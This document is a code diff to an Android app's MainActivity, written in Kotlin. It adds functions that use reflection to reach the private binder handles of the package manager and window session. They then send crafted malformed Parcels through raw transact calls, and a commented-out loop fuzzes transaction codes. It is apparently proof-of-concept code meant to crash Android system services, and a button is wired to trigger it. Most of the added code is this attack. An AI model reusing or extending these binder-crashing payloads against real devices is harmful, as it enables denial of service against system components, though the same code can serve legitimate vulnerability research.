@@ -6,13 +6,16 @@ import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.content.ServiceConnection
+import android.content.pm.PackageManager
 import android.util.Log
 import kotlinx.android.synthetic.main.activity_main.*
 import android.os.*
 import android.security.keystore.KeyGenParameterSpec
 import android.security.keystore.KeyProperties
+import android.view.View
 import androidx.annotation.RequiresApi
 import java.io.File
+import java.lang.RuntimeException
 import java.security.KeyStore
 import java.security.MessageDigest
 import javax.crypto.Cipher
@@ -27,7 +30,101 @@ class MainActivity : Activity() {
     fun readFile(file: File): ByteArray {
         return file.readBytes()
     }
+    fun TriggerPackageManagerCrash() {
+        val view = findViewById<View>(android.R.id.content)
+        Log.d("TriggerClipboardCrash", "TriggerClipboardCrash View <$view>")
+        val ActivityThreadClass = Class.forName("android.app.ActivityThread")
+        val GetPackageManagerMethod = ActivityThreadClass.getDeclaredMethod("getPackageManager")
+        GetPackageManagerMethod.isAccessible = true
+        val IPackageManagerProxy = GetPackageManagerMethod.invoke(null)
 
+        val mRemoteField = IPackageManagerProxy::class.java.getDeclaredField("mRemote")
+        mRemoteField.isAccessible = true
+        val mRemote = mRemoteField.get(IPackageManagerProxy) as IBinder
+
+        val data = Parcel.obtain();
+        data.writeInterfaceToken("android.content.pm.IPackageManager")
+//        data.writeLong(0)
+//        data.writeLong(0)
+//
+//        val bundle = Bundle()
+//        bundle.putString("TEXT", "From SomeTest")
+//        data.writeBundle(bundle);
+        val l1 = intArrayOf(
+            0xff00000, // 0x73622a85
+            0x00000113,
+            0xff00000,
+            0xff00000,
+            0xff00000,
+            0xff00000,
+            0xff00000,
+            -1,
+            -1
+        )
+        l1.forEach {
+            data.writeInt(it)
+        }
+
+        val reply = Parcel.obtain()
+
+        val res = mRemote.transact(37, data, reply, 17)
+
+
+
+        SystemClock.sleep(2000)
+    }
+    fun TriggerClipboardCrash() {
+        val view = findViewById<View>(android.R.id.content)
+        Log.d("TriggerClipboardCrash", "TriggerClipboardCrash View <$view>")
+        val mAttachInfoField = View::class.java.getDeclaredField("mAttachInfo")
+        mAttachInfoField.isAccessible = true
+        val attachInfo = mAttachInfoField.get(view)
+
+        val mWindowSessionField = attachInfo::class.java.getDeclaredField("mSession")
+        mWindowSessionField.isAccessible = true
+        val mWindowSession = mWindowSessionField.get(attachInfo)
+
+        val mRemoteField = mWindowSession::class.java.getDeclaredField("mRemote")
+        mRemoteField.isAccessible = true
+        val mWindowSessionBinder = mRemoteField.get(mWindowSession) as IBinder
+
+        val data = Parcel.obtain();
+        data.writeInterfaceToken("android.view.IWindowSession")
+        data.writeLong(0)
+        data.writeLong(0)
+
+        val bundle = Bundle()
+        bundle.putString("TEXT", "From SomeTest")
+        data.writeBundle(bundle);
+        val l1 = intArrayOf(
+            0xff00000, // 0x73622a85
+            0x00000113,
+            0xff00000,
+            0xff00000,
+            0xff00000,
+            0xff00000,
+            0xff00000,
+            -1,
+            -1
+        )
+        l1.forEach {
+            data.writeInt(it)
+        }
+
+        val reply = Parcel.obtain()
+        SystemClock.sleep(2000)
+//        for(i in 0..30) {
+//            Log.d("MainActivity", "TriggerClipboardCrash [+] it <$i>")
+//            val res = mWindowSessionBinder.transact(i, data, reply, 17)
+//            Log.d("MainActivity", "TriggerClipboardCrash [+] res <$res>")
+//        }
+
+        val res = mWindowSessionBinder.transact(13, data, reply, 17)
+        Log.d("MainActivity", "TriggerClipboardCrash [+] res <$res>")
+
+
+        SystemClock.sleep(2000)
+    }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -44,6 +141,10 @@ class MainActivity : Activity() {
                 SomeTest()
             }.start();
             true
+        }
+        clipboard_crash?.setOnClickListener {
+            //TriggerClipboardCrash()
+            TriggerPackageManagerCrash()
         }
 
 
@@ -172,6 +273,7 @@ class MainActivity : Activity() {
     }
 
     private var mService: Messenger? = null
+    private var mCustomBinder: MyBinderProxy? = null
 
     /** Flag indicating whether we have called bind on the service.  */
     private var bound: Boolean = false
@@ -182,7 +284,8 @@ class MainActivity : Activity() {
 
         override fun onServiceConnected(className: ComponentName, service: IBinder) {
             // We've bound to LocalService, cast the IBinder and get LocalService instance
-            mService = Messenger(service)
+//            mService = Messenger(service)
+            mCustomBinder = MyBinderProxy(service)
             bound = true
 
         }
@@ -194,18 +297,20 @@ class MainActivity : Activity() {
     }
 
     fun sayHello(text : String) {
+        SystemClock.sleep(2000)
         if (!bound) return
         // Create and send a message to the service, using a supported 'what' value
-        val msg: Message = Message.obtain(null, MSG_SAY_HELLO, 0, 0)
-        val data = Bundle()
-        data.putString("TEXT", text)
-        msg.data = data
-        try {
-            mService?.send(msg)
-        } catch (e: RemoteException) {
-            e.printStackTrace()
-        }
+//        val msg: Message = Message.obtain(null, MSG_SAY_HELLO, 0, 0)
+//        val data = Bundle()
+//        data.putString("TEXT", text)
+//        msg.data = data
+//        try {
+//            mService?.send(msg)
+//        } catch (e: RemoteException) {
+//            e.printStackTrace()
+//        }
 
+        mCustomBinder?.sendString(text)
     }
 
 
